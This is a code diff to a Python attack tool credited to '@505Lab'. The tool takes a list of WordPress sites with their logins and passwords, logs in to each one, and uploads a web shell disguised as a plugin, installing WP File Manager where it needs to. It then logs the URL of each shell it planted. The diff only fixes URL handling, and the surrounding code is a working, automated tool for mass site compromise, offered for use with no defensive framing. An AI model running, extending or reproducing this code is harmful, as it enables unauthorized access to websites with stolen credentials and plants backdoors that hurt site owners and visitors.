@@ -764,7 +764,7 @@ def wordpress_auto_upload_shell():
     os.system('clear')
     banner()
     print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
-    print("Note: File format should be url#(username)@(password)")
+    print("Note: File format should be url/wp-login.php#(username)@(password)")
     print(" ")
     print(" ")
     print("The wordpress login should have WP File Manager")
@@ -793,19 +793,19 @@ def wordpress_auto_upload_shell():
                 'log': username,
                 'pwd': password,
                 'wp-submit': 'Log In',
-                'redirect_to': f'{url}/wp-admin/',
+                'redirect_to': f'{url.replace("/wp-login.php", "")}/wp-admin/',
                 'testcookie': '1'
             }
             response = session.post(url, data=login_data)
             if response.status_code == 200 and 'wp-admin' in response.url:
                 print(f"\033[92m[+] SUCCESS: Logged in to: {url}\033[0m")
-                response = session.get(f'{url}/wp-admin/plugin-install.php?tab=upload')
+                response = session.get(f'{url.replace("/wp-login.php", "")}/wp-admin/plugin-install.php?tab=upload')
                 if 'upload-plugin' in response.text:
                     with open(shell_file, 'rb') as f:
                         files = {'pluginzip': f}
-                        response = session.post(f'{url}/wp-admin/update.php?action=upload-plugin', files=files)
+                        response = session.post(f'{url.replace("/wp-login.php", "")}/wp-admin/update.php?action=upload-plugin', files=files)
                         if 'Plugin installed successfully' in response.text:
-                            shell_url = f"{url}/{shell_file.split('/')[-1]}"
+                            shell_url = f"{url.replace('/wp-login.php', '')}/{shell_file.split('/')[-1]}"
                             print(f"\033[92m[+] SUCCESS: Shell uploaded to: {shell_url}\033[0m")
                             with open(output_file, "a") as success_file:
                                 success_file.write(f"{shell_url}\n")
@@ -817,14 +817,14 @@ def wordpress_auto_upload_shell():
                         'plugin': 'wp-file-manager',
                         'action': 'install-plugin'
                     }
-                    response = session.post(f'{url}/wp-admin/update.php?action=install-plugin', data=plugin_data)
+                    response = session.post(f'{url.replace("/wp-login.php", "")}/wp-admin/update.php?action=install-plugin', data=plugin_data)
                     if 'Plugin installed successfully' in response.text:
                         print(f"\033[92m[+] SUCCESS: WP File Manager installed on: {url}\033[0m")
                         with open(shell_file, 'rb') as f:
                             files = {'pluginzip': f}
-                            response = session.post(f'{url}/wp-admin/update.php?action=upload-plugin', files=files)
+                            response = session.post(f'{url.replace("/wp-login.php", "")}/wp-admin/update.php?action=upload-plugin', files=files)
                             if 'Plugin installed successfully' in response.text:
-                                shell_url = f"{url}/{shell_file.split('/')[-1]}"
+                                shell_url = f"{url.replace('/wp-login.php', '')}/{shell_file.split('/')[-1]}"
                                 print(f"\033[92m[+] SUCCESS: Shell uploaded to: {shell_url}\033[0m")
                                 with open(output_file, "a") as success_file:
                                     success_file.write(f"{shell_url}\n")
